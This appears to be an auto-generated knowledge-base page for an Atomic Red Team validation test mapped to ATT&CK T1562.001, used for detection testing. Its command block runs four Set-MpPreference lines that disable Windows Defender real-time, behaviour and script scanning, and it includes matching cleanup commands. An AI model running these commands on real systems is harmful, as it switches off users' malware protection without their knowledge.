---
atomic_guid: "6b8df440-51ec-4d53-bf83-899591c9b5d7"
title: "Tamper with Windows Defender ATP PowerShell"
framework: "atomic"
generated: "true"
attack_technique_id: "T1562.001"
attack_technique_name: "Impair Defenses: Disable or Modify Tools"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "6b8df440-51ec-4d53-bf83-899591c9b5d7"
  - "Tamper with Windows Defender ATP PowerShell"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Tamper with Windows Defender ATP PowerShell

Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled
in Windows settings.

## Metadata

- Atomic GUID: 6b8df440-51ec-4d53-bf83-899591c9b5d7
- Technique: T1562.001: Impair Defenses: Disable or Modify Tools
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1562.001/T1562.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1562-impair_defenses|T1562.001]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
Set-MpPreference -DisableRealtimeMonitoring 1
Set-MpPreference -DisableBehaviorMonitoring 1
Set-MpPreference -DisableScriptScanning 1
Set-MpPreference -DisableBlockAtFirstSeen 1
```

### Cleanup

```powershell
Set-MpPreference -DisableRealtimeMonitoring 0
Set-MpPreference -DisableBehaviorMonitoring 0
Set-MpPreference -DisableScriptScanning 0
Set-MpPreference -DisableBlockAtFirstSeen 0
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml)
